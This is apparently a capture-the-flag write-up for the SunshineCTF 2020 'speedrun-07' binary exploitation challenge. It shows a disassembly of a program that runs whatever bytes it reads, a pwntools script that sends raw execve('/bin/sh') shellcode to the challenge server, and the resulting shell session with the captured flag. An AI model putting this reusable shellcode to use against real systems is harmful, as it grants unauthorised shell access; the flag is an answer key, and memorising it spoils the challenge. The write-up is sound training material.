# speedrun-07

## Task

nc chal.2020.sunshinectf.org 30007

File: chall_07

Tags: binary exploitation

## Solution

```nasm
[0x00000630]> pdf @ main
            ; DATA XREF from entry0 @ 0x64d
┌ 134: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0xf0
│           ; var char *var_d0h @ rbp-0xd0
│           ; var int64_t canary @ rbp-0x8
│           0x0000073a      55             push rbp
│           0x0000073b      4889e5         mov rbp, rsp
│           0x0000073e      4881ecf00000.  sub rsp, 0xf0
│           0x00000745      64488b042528.  mov rax, qword fs:[0x28]
│           0x0000074e      488945f8       mov qword [canary], rax
│           0x00000752      31c0           xor eax, eax
│           0x00000754      488d3de90000.  lea rdi, str.In_the_land_of_raw_humanity ; 0x844 ; "In the land of raw humanity" ; const char *format
│           0x0000075b      b800000000     mov eax, 0
│           0x00000760      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00000765      488b15a40820.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x201010:8]=0 ; FILE *stream
│           0x0000076c      488d8510ffff.  lea rax, [s]
│           0x00000773      be13000000     mov esi, 0x13               ; int size
│           0x00000778      4889c7         mov rdi, rax                ; char *s
│           0x0000077b      e890feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00000780      488b15890820.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x201010:8]=0 ; FILE *stream
│           0x00000787      488d8530ffff.  lea rax, [var_d0h]
│           0x0000078e      bec8000000     mov esi, 0xc8               ; int size
│           0x00000793      4889c7         mov rdi, rax                ; char *s
│           0x00000796      e875feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0000079b      488d9530ffff.  lea rdx, [var_d0h]
│           0x000007a2      b800000000     mov eax, 0
│           0x000007a7      ffd2           call rdx
│           0x000007a9      90             nop
│           0x000007aa      488b45f8       mov rax, qword [canary]
│           0x000007ae      644833042528.  xor rax, qword fs:[0x28]
│       ┌─< 0x000007b7      7405           je 0x7be
│       │   0x000007b9      e832feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x7b7
│       └─> 0x000007be      c9             leave
└           0x000007bf      c3             ret
```

We now have a useless canary, two `fgets` calls and execute the bytes received from the second directly. Ehm, huh? Where is the challenge?

```python
from pwn import *

#p = process("./chall_07")
p = remote("chal.2020.sunshinectf.org", 30007)

payload = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

p.sendline()
p.sendline(payload)
p.interactive()
```

Turns out: no.

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30007: Done
[*] Switching to interactive mode
In the land of raw humanity$ ls
chall_07
flag.txt
$ cat flag.txt
sun{sidewinder-a80d0be1840663c4}
```

I thought they get harder when the number increases. Or is this the first challenge where you are supposed to shellcode your way to freedom?
